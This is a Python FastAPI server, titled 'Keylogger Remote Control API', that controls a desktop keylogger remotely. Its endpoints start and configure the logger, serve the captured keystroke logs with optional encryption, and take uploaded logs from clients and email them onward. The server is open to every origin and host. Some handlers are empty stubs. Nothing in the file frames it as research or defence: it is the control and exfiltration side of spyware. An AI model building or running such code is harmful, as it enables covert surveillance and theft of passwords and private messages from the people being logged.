import os
import json
from fastapi import FastAPI, HTTPException, UploadFile, File
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import Optional

# Import local modules
from keylogger import DesktopKeylogger
from encrypt import LogEncryptor
from email_sender import EmailReporter

app = FastAPI(title="Keylogger Remote Control API")

# Add CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # Allows all origins
    allow_credentials=True,
    allow_methods=["*"],  # Allows all methods
    allow_headers=["*"],  # Allows all headers
)

# Global keylogger instance
keylogger = DesktopKeylogger()
encryptor = LogEncryptor()
email_reporter = EmailReporter()

class KeyloggerConfig(BaseModel):
    """
    Configuration model for keylogger settings
    """
    email_reports: Optional[bool] = False
    log_interval: Optional[int] = 10
    encryption_enabled: Optional[bool] = True

@app.post("/start")
async def start_keylogging():
    """
    Start the keylogger
    """
    try:
        # In a real scenario, this would start a separate thread
        keylogger.start_logging()
        return {"status": "Keylogger started"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/stop")
async def stop_keylogging():
    """
    Stop the keylogger
    """
    try:
        # Implement stop mechanism
        return {"status": "Keylogger stopped"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/config")
async def update_config(config: KeyloggerConfig):
    """
    Update keylogger configuration
    """
    try:
        # Update configuration based on received settings
        if config.email_reports is not None:
            # Logic to enable/disable email reports
            pass
        
        if config.log_interval is not None:
            # Logic to update log interval
            pass
        
        if config.encryption_enabled is not None:
            # Logic to toggle encryption
            pass
        
        return {"status": "Configuration updated", "config": config}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/logs")
async def get_logs(encrypted: bool = False):
    """
    Retrieve keylogger logs
    """
    try:
        # Read logs from file
        with open('keylog.json', 'r') as f:
            logs = json.load(f)
        
        if encrypted:
            # Encrypt logs before sending
            encrypted_logs = encryptor.encrypt_log(json.dumps(logs))
            return {"logs": encrypted_logs.decode()}
        
        return {"logs": logs}
    except FileNotFoundError:
        raise HTTPException(status_code=404, detail="No logs found")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/upload_logs")
async def upload_logs(file: UploadFile = File(...)):
    """
    Upload logs from client
    """
    try:
        contents = await file.read()
        
        # Save uploaded logs
        with open('uploaded_logs.json', 'wb') as f:
            f.write(contents)
        
        # Optional: Send email with logs
        email_reporter.send_log_email('uploaded_logs.json')
        
        return {"status": "Logs uploaded successfully"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

def main():
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)

if __name__ == "__main__":
    main() 